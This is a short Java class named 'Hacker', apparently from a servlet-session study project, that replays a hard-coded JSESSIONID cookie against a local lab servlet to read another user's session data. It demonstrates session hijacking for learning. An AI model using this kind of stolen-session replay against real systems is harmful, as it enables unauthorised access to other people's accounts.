/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.web.study.servlet.session;

import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 *
 * @author MB-study
 */
public class Hacker {
    public static void main(String[] args) throws Exception{
        String path = "http://192.168.1.24:8080/JavaWeb0829/servlet/session/read";
        String id = "4AE8A5286285E7195026C95AA9B11F4E";
        URL url =new URL(path);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestProperty("Cookie", "JSESSIONID="+id);
        InputStream is = conn.getInputStream();
        InputStreamReader isr = new InputStreamReader(is);
        char[] cbuf = new char[1];
        while (isr.read(cbuf) != -1) {            
            System.out.print(cbuf);
        }
        
    }
}
